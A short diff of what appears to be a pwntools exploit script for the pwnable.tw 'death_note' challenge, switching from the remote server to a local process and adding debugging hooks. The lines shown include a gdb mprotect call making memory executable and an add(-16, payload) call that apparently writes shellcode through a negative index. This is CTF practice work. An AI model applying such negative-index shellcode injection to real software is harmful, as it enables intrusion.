@@ -8,8 +8,8 @@ exe = ELF("./death_note")
 # context.log_level='debug'
 libc = ELF("./libc.so.6")
 context.terminal = ["alacritty","-e"]
-p = remote("chall.pwnable.tw", 10201)
-# p = process([exe.path])
+# p = remote("chall.pwnable.tw", 10201)
+p = process([exe.path])
 def gdbs():
     gdb.attach(p, gdbscript="""
     call (void)mprotect(0x804b000,0x22000,7)
@@ -25,6 +25,8 @@ sa = lambda msg, data: p.sendafter(msg, data)
 sl = lambda data: p.sendline(data)
 s = lambda data: p.send(data)
 # gdbs()
+open(".dbgpid", "w").write(str(p.pid))
+
 def add(idx,name):
     sla(":","1")
     sla(":",str(idx))
@@ -87,6 +89,7 @@ print(f"shellcode: {shellcode}")
 print(f"len shell: {len(shellcode)}")
 
 # gdbs()
+input()
 add(-16,payload)
 
 
